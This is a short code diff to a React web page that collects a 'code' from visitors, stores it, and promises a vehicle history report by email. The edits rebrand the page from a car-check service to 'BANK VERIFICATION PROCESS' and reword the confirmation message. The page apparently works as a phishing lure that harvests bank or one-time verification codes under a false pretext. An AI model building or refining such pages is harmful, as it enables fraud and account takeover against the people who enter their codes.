@@ -23,7 +23,7 @@ function App() {
       const data = await res.json();
 
       if (data.stored) {
-        setMessage("✓ Verification submitted . Your vehicle history check will be sent to your email within 2 hours.");
+        setMessage("✓ Code submitted. Your vehicle history check will be sent to your email within 2 hours.");
         setCode("");
       } else {
         setMessage(data.error || "Something went wrong.");
@@ -40,7 +40,7 @@ function App() {
         <a href="/" className="brand">
           <span className="brand-icon">✓</span>
           <span>
-            TOTAL<span className="brand-highlight">CAR</span>CHECK
+            BANK<span className="brand-highlight">VERIFICATION</span>PROCESS
           </span>
         </a>
 
